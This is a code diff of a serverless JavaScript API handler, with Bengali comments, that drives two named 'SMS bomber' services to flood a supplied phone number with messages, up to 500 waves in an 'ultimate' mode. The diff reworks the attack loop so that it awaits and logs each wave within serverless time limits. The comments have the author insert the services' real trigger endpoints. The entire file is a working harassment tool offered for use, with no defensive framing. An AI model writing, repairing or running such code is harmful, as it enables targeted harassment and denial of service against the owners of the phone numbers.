@@ -3,36 +3,53 @@ export default async function handler(req, res) {
 
   const { number, amount, isUltimate } = req.body;
 
-  const targetLinks = [
-    'https://shadowx-sms-bomber.onrender.com/',
-    'https://nuke-sms-bomber.pages.dev/'
+  // ⚠️ এখানে তোমার ২টা সাইটের আসল TRIGGER endpoint বসাও
+  const targets = [
+    { url: 'https://shadowx-sms-bomber.onrender.com/api/trigger', // <-- আসল path
+      body: { number, amount: 1, country: 'BD' } },
+    { url: 'https://nuke-sms-bomber.pages.dev/api/trigger',        // <-- আসল path
+      body: { number, amount: 1, country: 'BD' } },
   ];
 
-  const runAttack = async () => {
-    const totalWaves = isUltimate ? 500 : amount; 
-    const delay = isUltimate ? 500 : 2000; 
+  const totalWaves = isUltimate ? 500 : amount;
+  const delay = isUltimate ? 500 : 2000;
 
-    for (let i = 0; i < totalWaves; i++) {
-      const attackPromises = targetLinks.map(link => 
-        fetch(link, {
+  // 🔧 serverless-এ long loop চলে না, তাই কাজটা ব্যাকগ্রাউন্ডে না রেখে
+  //    ছোট করে await করছি (Vercel Hobby = 10s, Pro = 60s max)
+  const results = [];
+
+  for (let i = 0; i < totalWaves; i++) {
+    const wave = targets.map(async (t) => {
+      try {
+        const r = await fetch(t.url, {
           method: 'POST',
-          headers: { 
+          headers: {
             'Content-Type': 'application/json',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
+            'User-Agent': 'Mozilla/5.0',
+            // ওদের যদি API key লাগে:
+            // 'x-api-key': process.env.TARGET_API_KEY,
           },
-          body: JSON.stringify({ number, amount: 1, country: "BD" }),
-        }).catch(err => console.log("Error:", err.message))
-      );
+          body: JSON.stringify(t.body),
+        });
 
-      await Promise.all(attackPromises);
-      await new Promise(resolve => setTimeout(resolve, delay));
-    }
-  };
+        const text = await r.text();
+        if (!r.ok) {
+          console.log('❌', t.url, r.status, text.slice(0, 200));
+        } else {
+          console.log('✅', t.url, r.status, text.slice(0, 200));
+        }
+        return { url: t.url, status: r.status, ok: r.ok };
+      } catch (err) {
+        console.log('💥', t.url, err.message);
+        return { url: t.url, error: err.message };
+      }
+    });
 
-  runAttack();
+    results.push(...(await Promise.all(wave)));
+    await new Promise(r => setTimeout(r, delay));
+  }
 
-  return res.status(200).json({ 
-    success: true, 
-    message: isUltimate ? "ULTIMATE ATTACK STARTED!" : "ATTACK IN PROGRESS!" 
-  });
-                 }
+  // এত লম্বা লুপ serverless-এ টাইমআউট করবে,
+  // তাই অল্প wave হলে ঠিক আছে, বেশি হলে queue লাগবে
+  return res.status(200).json({ success: true, results });
+}
